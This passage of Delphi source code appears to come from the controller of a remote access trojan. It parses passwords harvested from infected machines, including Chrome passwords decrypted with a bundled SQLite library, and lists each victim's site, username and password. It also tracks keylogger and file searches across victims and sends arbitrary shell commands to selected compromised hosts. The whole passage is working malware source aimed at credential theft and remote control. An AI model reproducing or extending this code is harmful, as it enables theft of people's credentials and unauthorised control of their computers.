          resStream := TResourceStream.Create(hInstance, 'SQLITE', 'sqlitefile');
          resStream.SaveToFile(SqlFile);
          resStream.Free;
        end;

        Randomize;
        i := GetTickCount + Random(999999);
        TempStr1 := MyTempFolder + IntToStr(i) + '.tmp';
        CriarArquivo(pWideChar(TempStr1), pWideChar(TempStr), Length(TempStr) * 2);

        TempStr := StartGetChromePass(SqlFile, TempStr1, DelimitadorComandosPassword);
      end;

      while TempStr <> '' do
      begin
        Application.ProcessMessages;
        TempStr1 := Copy(TempStr, 1, posex(#13#10, TempStr) - 1);
        Delete(TempStr, 1, posex(#13#10, TempStr) + 1);

        TipoSenha := Copy(TempStr1, 1, posex(DelimitadorComandosPassword, TempStr1) - 1);
        delete(TempStr1, 1, posex(DelimitadorComandosPassword, TempStr1) - 1);
        delete(TempStr1, 1, length(DelimitadorComandosPassword));

        UserSenha := Copy(TempStr1, 1, posex(DelimitadorComandosPassword, TempStr1) - 1);
        delete(TempStr1, 1, posex(DelimitadorComandosPassword, TempStr1) - 1);
        delete(TempStr1, 1, length(DelimitadorComandosPassword));

        PassSenha := Copy(TempStr1, 1, posex(DelimitadorComandosPassword, TempStr1) - 1);
        delete(TempStr1, 1, posex(DelimitadorComandosPassword, TempStr1) - 1);
        delete(TempStr1, 1, length(DelimitadorComandosPassword));

        JaExiste := False;
        NaoVale := False;
        for I := FormPasswords.AdvListView1.Items.Count - 1 downto 0 do
        begin
          if UserSenha = '' then
          begin
            NaoVale := True;
            Break;
          end else
          if (FormPasswords.AdvListView1.Items.Item[i].Caption = TipoSenha) and
             (FormPasswords.AdvListView1.Items.Item[i].SubItems.Strings[1] = UserSenha) and
             (FormPasswords.AdvListView1.Items.Item[i].SubItems.Strings[2] = PassSenha) then
          begin
            JaExiste := True;
            break;
          end;
        end;

        if (JaExiste = True) or (NaoVale = True) then Continue;

        if (
            (PassImage = 72) or  // Navegadores
            (PassImage = 71) or
            (PassImage = 107) or
            (PassImage = 117) or
            (PassImage = 120)
           ) and
           (
            (posex('//', TipoSenha) <= 0) and
            (posex('microsoft_wininet', LowerCase(TipoSenha)) <= 0) and
            (posex('RAS Passwords', TipoSenha) <= 0)
           ) then Continue;

        Item := FormPasswords.AdvListView1.Items.Add;
        Item.ImageIndex := PassImage;

        Item.Caption := TipoSenha;
        Item.SubItems.Add(ConAux.NomeDoServidor);
        Item.SubItems.Add(UserSenha);
        Item.SubItems.Add(PassSenha);

        if (PassSenha <> '') and (PassImage = 107) then
        begin
          Randomize;
          i := GetTickCount + Random(999999);
          Item.Data := TObject(i);
          ConAux.EnviarString(CHROMEPASS + DelimitadorComandos + IntToStr(i) + '|' + TempStr1);
        end else try if item.SubItems.Strings[2] = traduzidos[520] then item.SubItems.Strings[2] := '' except end;
      end;
    end;

    ConAuxNewConnection.Connection.Disconnect;
  end else

  if copy(recebido, 1, posex('|', recebido) - 1) = KEYSEARCH then
  begin
    Application.ProcessMessages;
    FormKeySearch.AdvProgressBar1.Position := FormKeySearch.AdvProgressBar1.Position + 1;
    FormKeySearch.AdvProgressBar1.Refresh;
    Application.ProcessMessages;
    delete(recebido, 1, posex('|', recebido));
    if recebido = 'YES' then
    begin
      Item := FormKeySearch.AdvListView1.Items.Add;
      Item.ImageIndex := ConAux.ImagemBandeira;
      Item.Caption := ConAux.NomeDoServidor;
      Item.SubItems.Add(ConAux.Pais);
      Item.Data := TObject(ConAux);
    end;
  end else

  if copy(recebido, 1, posex('|', recebido) - 1) = FILESEARCH then
  begin
    Application.ProcessMessages;
    FormFileSearch.AdvProgressBar1.Position := FormFileSearch.AdvProgressBar1.Position + 1;
    FormFileSearch.AdvProgressBar1.Refresh;
    Application.ProcessMessages;

    delete(recebido, 1, posex('|', recebido));
    if recebido <> '' then
    begin
      Item := FormFileSearch.AdvListView1.Items.Add;
      Item.ImageIndex := ConAux.ImagemBandeira;
      Item.Caption := ConAux.NomeDoServidor;

      Dados := TSearchFilesDados.Create;
      Dados.FileName := Recebido;

      Item.SubItems.AddObject(ConAux.Pais, TObject(Dados));
      Item.Data := TObject(ConAux);
    end;
  end else




  begin

  end;
  MainList.Refresh;
end;

procedure TFormMain.Executarcomandos1Click(Sender: TObject);
var
  i: integer;
  ConAux: TConexaoNew;
  Node: pVirtualNode;
  Name: string;
begin
  application.ProcessMessages;
  name := LastExecuteCommand;
  if inputquery(pwidechar(traduzidos[176]), pwidechar(traduzidos[177]), name) = false then exit;
  LastExecuteCommand := Name;

  Node := MainList.GetFirstSelected;
  while Assigned(Node) do
  begin
    ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);
    if (ConAux <> nil) and (Node.ChildCount <= 0) and (vsSelected in Node.States) then
    begin
      ConAux.EnviarString(EXECCOMANDO + DelimitadorComandos + LastExecuteCommand);
    end;
    Node := MainList.GetNextSelected(Node);
  end;
end;

end.
